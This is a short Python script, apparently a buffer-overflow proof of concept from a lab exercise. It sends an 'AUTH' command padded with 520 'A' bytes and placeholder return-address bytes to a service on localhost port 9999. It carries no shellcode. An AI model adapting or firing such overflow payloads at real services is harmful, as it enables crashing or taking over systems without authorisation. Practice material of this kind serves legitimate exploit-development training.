import socket, struct
payload = b"AUTH " + (b"A" * 520) + b"BBBBCCCC"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(payload)
s.close()
